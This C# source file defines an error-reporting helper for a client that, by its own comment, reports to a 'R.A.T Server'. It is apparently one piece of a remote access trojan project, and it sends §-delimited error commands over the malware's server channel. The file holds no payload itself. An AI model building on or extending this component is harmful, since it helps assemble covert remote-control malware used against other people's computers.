using System.Text;

using TutClient.Enum;
using TutClient.Handlers;

namespace TutClient.Helpers
{
    public interface IReportHelper
    {
        void ReportError(ErrorType type, string title, string message);
    }

    public class ReportHelper : IReportHelper
    {
        private readonly ICommandHandler _commandHandler;

        public ReportHelper(ICommandHandler commandHandler)
        {
            _commandHandler = commandHandler;
        }

        /// <summary>
        /// Report a client-side error to the R.A.T Server
        /// </summary>
        /// <param name="type">The error type/code</param>
        /// <param name="title">The short title of the error</param>
        /// <param name="message">The longer message of the error</param>
        public void ReportError(ErrorType type, string title, string message)
        {
            StringBuilder error = new StringBuilder();
            // Create command
            error.Append("error§")
                 .Append(type).Append("§")
                 .Append(title).Append("§")
                 .Append(message);

            _commandHandler.SendCommand(error.ToString()); //Send to server
        }
    }
}